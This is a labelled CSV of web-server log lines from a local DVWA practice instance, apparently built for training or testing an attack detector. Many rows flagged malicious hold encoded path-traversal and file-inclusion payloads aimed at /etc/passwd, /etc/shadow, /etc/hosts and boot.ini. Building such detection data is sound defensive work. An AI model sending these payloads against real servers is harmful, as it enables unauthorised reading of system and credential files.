,url,malicious
146,"127.0.0.1 - - [28/Apr/2021:22:30:39 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 2385 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
82,"127.0.0.1 - - [28/Apr/2021:22:32:04 -0400] ""GET /DVWA/vulnerabilities/fi/?page=C%3a%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
100,"127.0.0.1 - - [28/Apr/2021:22:50:47 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1590 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
74,"127.0.0.1 - - [28/Apr/2021:22:32:25 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
101,"127.0.0.1 - - [28/Apr/2021:21:59:01 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1631 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
208,"127.0.0.1 - - [28/Apr/2021:21:42:20 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1957 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
234,"127.0.0.1 - - [28/Apr/2021:22:12:31 -0400] ""GET /DVWA/security.php HTTP/1.1"" 200 2398 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
79,"127.0.0.1 - - [28/Apr/2021:22:30:35 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2A HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
35,"127.0.0.1 - - [28/Apr/2021:22:31:25 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
85,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
124,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
123,"127.0.0.1 - - [28/Apr/2021:22:14:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1"" 200 2422 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
3,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
94,"127.0.0.1 - - [28/Apr/2021:21:44:11 -0400] ""POST /DVWA/setup.php HTTP/1.1"" 302 342 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
63,"127.0.0.1 - - [28/Apr/2021:22:50:29 -0400] ""GET /DVWA/vulnerabilities/csrf/ HTTP/1.1"" 200 1808 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
24,"127.0.0.1 - - [28/Apr/2021:22:50:50 -0400] ""GET /DVWA/vulnerabilities/captcha/ HTTP/1.1"" 200 1809 ""http://127.0.0.1/DVWA/vulnerabilities/upload/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
211,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
30,"127.0.0.1 - - [28/Apr/2021:22:50:52 -0400] ""GET /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1"" 200 1682 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
227,"127.0.0.1 - - [28/Apr/2021:22:31:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
152,"127.0.0.1 - - [28/Apr/2021:22:50:54 -0400] ""GET /DVWA/vulnerabilities/sqli/ HTTP/1.1"" 200 1638 ""http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
92,"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts HTTP/1.1"" 200 1476 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
137,"127.0.0.1 - - [28/Apr/2021:22:15:03 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
117,"127.0.0.1 - - [28/Apr/2021:22:51:06 -0400] ""GET /DVWA/vulnerabilities/xss_d/ HTTP/1.1"" 200 1773 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
196,"127.0.0.1 - - [28/Apr/2021:21:53:44 -0400] ""POST /DVWA/login.php HTTP/1.1"" 302 337 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
215,"127.0.0.1 - - [28/Apr/2021:21:54:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
19,"127.0.0.1 - - [28/Apr/2021:21:58:13 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1674 ""http://127.0.0.1/DVWA/vulnerabilities/upload/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
118,"127.0.0.1 - - [28/Apr/2021:21:53:28 -0400] ""GET /DVWA/dvwa/css/login.css HTTP/1.1"" 200 741 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17,"127.0.0.1 - - [28/Apr/2021:21:58:21 -0400] ""GET /DVWA/dvwa/css/login.css HTTP/1.1"" 200 741 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
29,"127.0.0.1 - - [28/Apr/2021:21:53:44 -0400] ""GET /DVWA/login.php HTTP/1.1"" 200 1012 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
87,"127.0.0.1 - - [28/Apr/2021:22:30:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%5e%5e HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
170,"127.0.0.1 - - [28/Apr/2021:22:30:43 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
113,"127.0.0.1 - - [28/Apr/2021:22:12:25 -0400] ""GET /DVWA/about.php HTTP/1.1"" 200 2294 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
154,"127.0.0.1 - - [28/Apr/2021:21:49:05 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 2102 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
126,"127.0.0.1 - - [28/Apr/2021:21:54:18 -0400] ""GET /DVWA/vulnerabilities/exec/ HTTP/1.1"" 200 1721 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
44,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1979 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
167,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
115,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
205,"127.0.0.1 - - [28/Apr/2021:22:32:14 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
50,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/dvwa/images/login_logo.png HTTP/1.1"" 200 9375 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
42,"127.0.0.1 - - [28/Apr/2021:22:30:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
119,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1675 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
164,"127.0.0.1 - - [28/Apr/2021:21:54:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
147,"127.0.0.1 - - [28/Apr/2021:22:32:33 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
161,"127.0.0.1 - - [28/Apr/2021:22:31:27 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
6,"127.0.0.1 - - [28/Apr/2021:22:12:31 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
171,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
60,"127.0.0.1 - - [28/Apr/2021:22:30:45 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
98,"127.0.0.1 - - [28/Apr/2021:21:44:11 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9,"127.0.0.1 - - [28/Apr/2021:22:32:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2flocalstart%2easp HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
121,"127.0.0.1 - - [28/Apr/2021:22:30:55 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
183,"127.0.0.1 - - [28/Apr/2021:21:58:21 -0400] ""GET /DVWA/dvwa/images/login_logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
159,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
216,"127.0.0.1 - - [28/Apr/2021:21:58:58 -0400] ""GET /DVWA/index.php HTTP/1.1"" 200 2877 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
160,"127.0.0.1 - - [28/Apr/2021:22:30:57 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
62,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
21,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
169,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
223,"127.0.0.1 - - [28/Apr/2021:21:40:41 -0400] ""GET /DVWA/ HTTP/1.1"" 200 532 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
47,"127.0.0.1 - - [28/Apr/2021:22:12:28 -0400] ""GET /DVWA/dvwa/images/lock.png HTTP/1.1"" 200 1045 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
93,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
200,"127.0.0.1 - - [28/Apr/2021:22:11:39 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1631 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
38,"127.0.0.1 - - [28/Apr/2021:21:58:58 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
150,"127.0.0.1 - - [28/Apr/2021:22:12:28 -0400] ""GET /DVWA/security.php HTTP/1.1"" 200 2383 ""http://127.0.0.1/DVWA/about.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
204,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10,"127.0.0.1 - - [28/Apr/2021:21:54:18 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 625 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
186,"127.0.0.1 - - [28/Apr/2021:22:50:51 -0400] ""GET /DVWA/vulnerabilities/sqli/ HTTP/1.1"" 200 1638 ""http://127.0.0.1/DVWA/vulnerabilities/captcha/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
